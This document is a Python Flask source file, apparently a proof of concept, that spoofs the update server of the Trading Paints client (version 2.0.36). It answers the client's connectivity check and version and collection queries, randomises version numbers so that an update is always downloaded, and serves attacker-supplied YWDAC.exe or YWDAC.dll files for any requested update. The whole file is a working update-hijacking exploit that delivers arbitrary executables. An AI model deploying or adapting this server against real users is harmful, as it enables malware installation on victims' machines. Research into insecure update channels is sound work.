"""
YWDAC - Small webserver to serve exploit to Trading Paints (version 2.0.36)
"""


"""Imported Libraries

flask - Webserver
random - Make random version numbers
"""
import flask
import random


"""Global Variables

app - Flask WebApp
"""
app = flask.Flask(__name__)


@app.route('/')
def index() -> flask.Response:
    """Let people know not to go to this site :_

    :return: HTML Response
    :rtype: flask.Response
    """
    return '<h1>Warning</h1>This is a malicious webserver'


@app.route('/connectionCheck.php')
def connection_check() -> flask.Response:
    """'TP Updater.exe' connects to check connectivity

    :return: HTML Response
    :rtype: flask.Response
    """
    return '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n<html xmlns="http://www.w3.org/1999/xhtml">\n<head>\n<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n<title></title>\n</head>\n\n<body>\nok\n</body>\n</html>\n'


@app.route('/version.xml')
@app.route('/version2.xml')
def version() -> flask.Response:
    """This file contains the EXE/DLL listing and their version

    :return: XML Response
    :rtype: flask.Response
    """
    v = "{}.{}.{}".format(random.randint(0, 6), random.randint(0, 6), random.randint(0, 6))
    with open('version.xml', 'r') as f:
        contents = f.read()
    # we do this to ensure the file is always downloaded, regardless of version
    contents = contents.replace('<version></version>', '<version>{}</version>'.format(v))
    return contents


@app.route('/collections.php')
def collections() -> flask.Response:
    """Called to grab the cars that the user defined paints for.

    :return: XML Response
    :rtype: flask.Response
    """
    return '<?xml version="1.0?>\n<TPXML version="1.0">\n<Collections>\n</Collections>\n</TPXML>\n'


@app.route('/updates/<fname>')
def serve_malware(fname: str) -> flask.Response:
    """Called when the actual malicious files/updates are being downloaded

    :param fname: File name
    :type fname: str
    :return: File response
    :rtype: flask.Response
    """
    fname = fname.lower()

    if fname.lower().endswith('.exe'):
        return flask.send_file('YWDAC.exe')
    elif fname.lower().endswith('.dll'):
        return flask.send_file('YWDAC.dll')
    else:
        return "pwnd!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)